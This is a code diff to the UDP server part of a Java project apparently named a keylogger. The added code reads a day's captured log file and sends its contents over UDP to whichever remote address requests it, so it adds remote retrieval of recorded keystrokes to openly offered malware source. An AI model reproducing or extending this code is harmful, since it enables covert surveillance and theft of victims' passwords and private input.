@@ -1,5 +1,6 @@
 package com.hao.keylogger.controllers.server;
 
+import java.io.File;
 import java.io.IOException;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
@@ -23,7 +24,7 @@ public class UDPServerHelper {
 	private String hostName;
 	private int port;
 
-	private byte[] buffer = new byte[256];
+	private byte[] buffer = new byte[Resource.SERVER_BUFFER_SIZE];
 	
 	Thread listenThread;
 
@@ -99,6 +100,7 @@ public class UDPServerHelper {
 						// format name of log files: dd-MM-yyyy.txt
 						SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy");
 						Date dateOfLog = sdf.parse(dateStr);
+						controller.appendToMonitory("Processing: " + "get log on the day " + dateOfLog.toString());
 						getLogAndSend(inPacket.getAddress(), inPacket.getPort(), dateOfLog);
 						break;
 					case Resource.FETCH_ALL_LOG_REQUEST:
@@ -112,14 +114,24 @@ public class UDPServerHelper {
 		}
 		
 		private void getLogAndSend(InetAddress address, int port, Date date) {
-			System.out.println(date.toString());
-			String retMsg = date.toString(); 
-			DatagramPacket outPacket = new DatagramPacket(retMsg.getBytes(), retMsg.length(), address, port);
+			String dateStr = new SimpleDateFormat("dd-MM-yyyy").format(date);
+			String logFilePath = Resource.LOGS_DIRECTORY + File.separator + dateStr + Resource.LOG_FILE_EXTENSION;
+			FileManager fm = new FileManager(logFilePath);
+			
+			String logContent;
 			try {
-				socket.send(outPacket);
-			} catch (IOException e) {
-				e.printStackTrace();
+				logContent = fm.readAll();
+				System.out.println(logContent);
+				DatagramPacket outPacket = new DatagramPacket(logContent.getBytes(), logContent.length(), address, port);
+				try {
+					socket.send(outPacket);
+				} catch (IOException e) {
+					controller.appendToMonitory("Processing: " + "Can not send packet");
+				}
+			} catch (IOException e1) {
+				controller.appendToMonitory("Processing: " + "File not found");
 			}
+			
 		}
 	}
 
